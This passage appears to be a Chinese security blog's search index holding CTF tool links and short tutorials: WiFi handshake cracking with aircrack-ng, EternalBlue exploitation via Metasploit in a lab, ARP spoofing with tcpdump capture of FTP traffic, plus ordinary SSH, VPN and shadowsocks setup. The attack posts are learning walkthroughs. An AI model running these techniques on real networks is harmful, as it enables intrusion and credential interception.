rel="noopener">PngCheck</a> (png图像区块分析工具)</li><li><a href="http://pan.baidu.com/s/1mhHzTji" target="_blank" rel="noopener">OutGuess隐写工具</a> (图像隐写工具OutGuess)</li><li><a href="http://pan.baidu.com/s/1jIpZNj4" target="_blank" rel="noopener">JHide隐写工具</a> (JHide图片隐写工具)</li><li><a href="http://pan.baidu.com/s/1nvB8zDB" target="_blank" rel="noopener">PDF隐写工具</a> (PDF隐写工具)</li><li><a href="https://pan.baidu.com/s/1slUwxhN" target="_blank" rel="noopener">WaveEditor</a> (音频波形编辑工具)</li><li><a href="http://pan.baidu.com/s/1pLQxthD" target="_blank" rel="noopener">Sonicvisualiser</a> (音频频谱分析工具)</li></ul></li><li><strong>反编译</strong><ul><li><a href="http://pan.baidu.com/s/1nuHY7Bb" target="_blank" rel="noopener">IDAQ</a> (反编译工具)</li></ul></li><li><strong>破解</strong><ul><li><a href="http://pan.baidu.com/s/1mi8Nwdq" target="_blank" rel="noopener">ARPR</a> (压缩文件破解工具)</li><li><a href="http://pan.baidu.com/s/1b0Knj4" target="_blank" rel="noopener">Base64编码解码器</a>(Base64编码解码器)</li><li><a href="http://pan.baidu.com/s/1c1NIHFU" target="_blank" rel="noopener">F5算法(隐写)</a></li></ul></li></ul><blockquote><p>文件</p></blockquote><ul><li><a href="http://www.cnblogs.com/qfcndtt/archive/2012/05/08/2489761.html" target="_blank" rel="noopener">文件头</a></li></ul><blockquote><p>编码</p></blockquote><ul><li><a href="http://tool.oschina.net/commons?type=4" target="_blank" rel="noopener">ASCII</a></li><li><a href="http://baike.baidu.com/link?url=EAHhU36dVREhqMHIQKTIntQR54YUck5k4fk75JGGjyNwB1nBMryoYzbQrzB7mc6y" target="_blank" rel="noopener">摩尔斯电码</a></li><li><a href="http://baike.baidu.com/view/2238848.htm" target="_blank" rel="noopener">培根密码</a></li></ul><blockquote><p>API</p></blockquote><ul><li><a href="http://php.net/docs.php" target="_blank" rel="noopener">PHP API</a></li></ul><p>工具集： <a href="https://www.ctftools.com/down/down/passwd/" target="_blank" rel="noopener">密码机器</a>（强烈推荐） 包含了：栅栏密码 ，凯撒密码，维吉尼亚密码，摩斯电码，MD5 ，置换密码，替代密码 等。 常见密码： <a href="http://base64.xpcha.com/" target="_blank" rel="noopener">base64</a> <a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">ascii与十六进制、十进制、二进制转换</a> <a href="https://www.convertstring.com/zh_CN/EncodeDecode/UrlDecode" target="_blank" rel="noopener">url解密</a> 编码： JavaScript之jsfuck： <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">在线解码</a> 或 在浏览器F12的调试器中执行 <a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">brainfuck</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF密码 </category>
+          
+          <category> 古典密码 </category>
+          
+          <category> 密码学 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>aircrack-ng破解握手包</title>
+      <link href="/2017/10/19/aircrack-ng-e7-a0-b4-e8-a7-a3-e6-8f-a1-e6-89-8b-e5-8c-85/"/>
+      <url>/2017/10/19/aircrack-ng-e7-a0-b4-e8-a7-a3-e6-8f-a1-e6-89-8b-e5-8c-85/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>现在我们有个抓到的wifi握手包 使用aircrack-ng，配合密码字典，跑字典破解wifi密码 <img src="http://112.74.49.123/wp-content/uploads/2017/10/0956.jpg" alt=""> 从上边图片可以看到，抓到的握手包中的流量信息显示有三张网卡，可以看到第一张网卡No date，第二张网卡为内网有线网卡，而第三张网卡是D-Link的WPA加密的握手包，所以选择网卡三。 <img src="http://112.74.49.123/wp-content/uploads/2017/10/1337.jpg" alt=""> 经过三秒跑密码包，跑出wifi密码 ps：题目来自<a href="http://123.206.31.85/challenges" target="_blank" rel="noopener">CTF-练习平台</a>中MISC的“想蹭网先解开密码”</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> kali linux </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>binwalk的使用方法</title>
+      <link href="/2017/10/19/binwalk-e7-9a-84-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/"/>
+      <url>/2017/10/19/binwalk-e7-9a-84-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>一、binwalk工具的基本用法介绍 1、获取帮助信息 binwalk -h 或 binwalk –help 2.文件分析扫描 binwalk 文件 3.提取文件系统 binwalk -e 文件 二、使用范例 实验吧的一道隐写术——“<a href="http://www.shiyanbar.com/ctf/58" target="_blank" rel="noopener">女神又和大家见面了</a>“ 附件为：<a href="http://ctf5.shiyanbar.com/stega/3.jpg" target="_blank" rel="noopener">3.jpg</a> 放在kali的root目录下，使用binwalk查看文件结构 <img src="http://112.74.49.123/wp-content/uploads/2017/10/019.jpg" alt=""> 发现有zip，且zip内有music.mp3一个 使用binwalk -e 3.jpg导出文件 <img src="http://112.74.49.123/wp-content/uploads/2017/10/342.jpg" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2017/10/538.jpg" alt=""> 然后是MP3隐写，这段不提，想知道的朋友自行去实验吧查看writeup。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> kali linux </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>永恒之蓝（ms17-010）复现</title>
+      <link href="/2017/10/19/e6-b0-b8-e6-81-92-e4-b9-8b-e8-93-9d-ef-bc-88ms17-010-ef-bc-89-e5-a4-8d-e7-8e-b0/"/>
+      <url>/2017/10/19/e6-b0-b8-e6-81-92-e4-b9-8b-e8-93-9d-ef-bc-88ms17-010-ef-bc-89-e5-a4-8d-e7-8e-b0/</url>
+      
+        <content type="html"><![CDATA[<p>首先，在<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">MSDN</a>下载一个<a href="http://ed2k://|file|cn_windows_7_professional_x64_dvd_x15-65791.iso|3341268992|3474800521D169FBF3F5E527CD835156|/" target="_blank" rel="noopener">Windows 7 Professional (x64) - DVD (Chinese-Simplified)</a>。 在虚拟机上安装好。 查看靶机ip <img src="http://112.74.49.123/wp-content/uploads/2017/10/214.jpg" alt=""> 打开kali linux里边的metasploit <img src="http://112.74.49.123/wp-content/uploads/2017/10/422.jpg" alt=""> search ms17 <img src="http://112.74.49.123/wp-content/uploads/2017/10/541.jpg" alt=""> 使用永恒之蓝漏洞 <img src="http://112.74.49.123/wp-content/uploads/2017/10/631.jpg" alt=""> 查看攻击载荷 <img src="http://112.74.49.123/wp-content/uploads/2017/10/716.jpg" alt=""> 配置靶机ip <img src="http://112.74.49.123/wp-content/uploads/2017/10/754.jpg" alt=""> exploit <img src="http://112.74.49.123/wp-content/uploads/2017/10/847.jpg" alt=""> 已获得最高权限 <img src="http://112.74.49.123/wp-content/uploads/2017/10/930.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> kali linux </category>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux开启ssh</title>
+      <link href="/2017/10/19/linux-e5-bc-80-e5-90-afssh/"/>
+      <url>/2017/10/19/linux-e5-bc-80-e5-90-afssh/</url>
+      
+        <content type="html"><![CDATA[<p>第一步：安装sshd服务 Ubuntu等Debian系： apt-get install sshd Centos等Redhat系： yum install sshd 第二步：配置文件 *配置之前先备份：cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak vim /etc/ssh/sshd_config 将箭头所指的两项修改为 <img src="http://112.74.49.123/wp-content/uploads/2017/10/19-1.jpg" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2017/10/19-2.jpg" alt=""> 保存并退出 第三步：重启sshd服务 service sshd restart 好了，可以连接了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> linux通用 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali linux环境下的arp攻击</title>
+      <link href="/2017/10/19/kali-linux-e7-8e-af-e5-a2-83-e4-b8-8b-e7-9a-84arp-e6-94-bb-e5-87-bb/"/>
+      <url>/2017/10/19/kali-linux-e7-8e-af-e5-a2-83-e4-b8-8b-e7-9a-84arp-e6-94-bb-e5-87-bb/</url>
+      
+        <content type="html"><![CDATA[<p>在kali linux系统下自带工具中有个arp神器叫做“arpspoof”，废话不多说，直接上手 此次实验环境为靶机与FTP服务器之间的arp中间人 靶机　　　　　ip：10.90.100.53　　 mac：04:69:f8:db:75:6b 中间人kali　　 ip：10.90.100.242　　 mac：00:0c:29:a7:16:35 FTP服务器　　 ip：10.90.100.68　 　mac：00:0c:29:bb:44:56 实验网络拓扑图如下 <img src="http://112.74.49.123/wp-content/uploads/2017/10/1.png" alt="null"> 第一步：echo 1 &gt; /proc/sys/net/ipv4/ip_forward kali开启转发功能 <img src="http://112.74.49.123/wp-content/uploads/2017/10/2.jpg" alt=""> 第二步：arp攻击前靶机ARP表中FTP服务器的mac地址 <img src="http://112.74.49.123/wp-content/uploads/2017/10/3.jpg" alt=""> 第三步：用arpspoof实现双向欺骗 <img src="http://112.74.49.123/wp-content/uploads/2017/10/41.jpg" alt=""> 第四步：在靶机上查看FTP服务器mac地址以验证是否欺骗成功 <img src="http://112.74.49.123/wp-content/uploads/2017/10/5.jpg" alt=""> 第五步：使用工具tcpdump监听ftp端口21端口并将所截获数据包导入到1.txt中（如没有1.txt，则自动新建） tcpdump -nn -X -i eth0 tcp prot 21 &gt; 1.txt <img src="http://112.74.49.123/wp-content/uploads/2017/10/6.jpg" alt=""> 第六步：查看数据包并查找有用信息 <img src="http://112.74.49.123/wp-content/uploads/2017/10/7.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> kali linux </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一键搭建VPN(修改ing.....)</title>
+      <link href="/2017/10/19/e4-b8-80-e9-94-ae-e6-90-ad-e5-bb-bavpn/"/>
+      <url>/2017/10/19/e4-b8-80-e9-94-ae-e6-90-ad-e5-bb-bavpn/</url>
+      
+        <content type="html"><![CDATA[<p>Ubuntu等debian系： wget <a href="https://git.io/vpnsetup" target="_blank" rel="noopener">https://git.io/vpnsetup</a> -O vpnsetup.sh centos等Redhat系： wget <a href="https://git.io/vpnsetup-centos" target="_blank" rel="noopener">https://git.io/vpnsetup-centos</a> -O vpnsetup.sh 先下载这个自动化脚本，然后vim vpnsetup.sh <img src="http://112.74.49.123/wp-content/uploads/2017/10/00.jpg" alt=""> 编辑 YOUR_IPSEC_PSK=’你的IPsec预共享密钥’ YOUR_USERNAME=’你的VPN用户名’ YOUR_PASSWORD=’你的VPN密码’ 然后运行脚本 一段时间等待后 <img src="http://112.74.49.123/wp-content/uploads/2017/10/4.jpg" alt=""> 恭喜你，拿着这些信息登录去吧</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> linux通用 </category>
+          
+          <category> 代理 </category>
+          
+          <category> 科学上网 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Centos7.2 搭建SS</title>
+      <link href="/2017/10/19/centos7-2-e6-90-ad-e5-bb-bass/"/>
+      <url>/2017/10/19/centos7-2-e6-90-ad-e5-bb-bass/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>今天我把我的阿里云服务器系统改成了Centos7.2，为了能在本地享受到阿里云飞一般的网速，我决定在服务器上搭建一个ss。 第一步：安装 pip pip是python用来加载各种模块的一个工具。 我使用的是python下的shadowsocks模块。 这个shadowsocks模块可以在 pip 上直接安装。 curl “<a href="https://bootstrap.pypa.io/get-pip.py&quot;" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py&quot;</a> -o “get-pip.py” python get-pip.py 第二步：安装配置 shadowsocks 安装 shadowsocks： pip install –upgrade pip pip install shadowsocks 第三步：配置文件 安装完成后，需要创建配置文件/etc/shadowsocks.json，内容如下： { “server”: “0.0.0.0”, “server_port”: 8388, “password”: “你的密码”, “method”: “aes-256-cfb” } 第四步： 新建启动脚本文件/etc/systemd/system/shadowsocks.service，内容如下： [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json [Install] WantedBy=multi-user.target 第五步：启动 shadowsocks 服务 systemctl start shadowsocks 接下来，就是在本地用ss软件连接我的阿里云服务器了，连上之后查一下ip emmmmm…..nice~ <img src="http://112.74.49.123/wp-content/uploads/2017/10/ip.jpg" alt="ip"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> centos </category>
+          
+          <category> linux </category>
+          
+          <category> 代理 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
